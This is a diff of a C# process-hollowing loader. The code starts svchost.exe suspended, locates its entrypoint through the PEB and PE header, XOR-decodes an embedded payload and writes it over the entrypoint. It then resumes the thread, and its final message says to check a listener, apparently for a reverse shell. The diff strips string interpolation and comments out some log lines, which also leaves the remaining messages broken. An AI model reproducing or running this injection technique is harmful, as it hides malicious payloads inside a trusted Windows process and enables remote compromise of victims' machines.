@@ -152,14 +152,14 @@ namespace ProcessHollowing
             ProcessInfo pInfo = new ProcessInfo();
             bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                 false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
-            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");
+            Console.WriteLine("Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");
 
             // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
             ProcessBasicInfo pbInfo = new ProcessBasicInfo();
             uint retLen = new uint();
             long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
             IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
-            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");
+            Console.WriteLine("Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");
 
             // Get entry point of the actual process executable
             // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
@@ -177,15 +177,15 @@ namespace ProcessHollowing
             bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
             IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
             result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
-            Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");
+            Console.WriteLine("DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");
 
             // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
             uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
-            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");
+            Console.WriteLine("DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");
 
             // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
             uint rvaOffset = e_lfanew + 0x28;
-            Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");
+            Console.WriteLine("DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");
 
             // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
             uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
@@ -193,22 +193,22 @@ namespace ProcessHollowing
 
             // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
             IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
-            Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");
+            Console.WriteLine("Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");
 
             // Carrying on, decode the XOR payload
             for (int i = 0; i < buf.Length; i++)
             {
                 buf[i] = (byte)((uint)buf[i] ^ 0xfa);
             }
-            Console.WriteLine("XOR-decoded payload.");
+            //Console.WriteLine("XOR-decoded payload.");
 
             // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
             result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
-            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");
+            //Console.WriteLine("Overwrote entrypoint with payload. Success: {result}.");
 
             // Resume the thread to trigger our payload
             uint rResult = ResumeThread(pInfo.hThread);
-            Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
+            Console.WriteLine("Triggered payload. Success: {rResult == 1}. Check your listener!");
         }
     }
 }
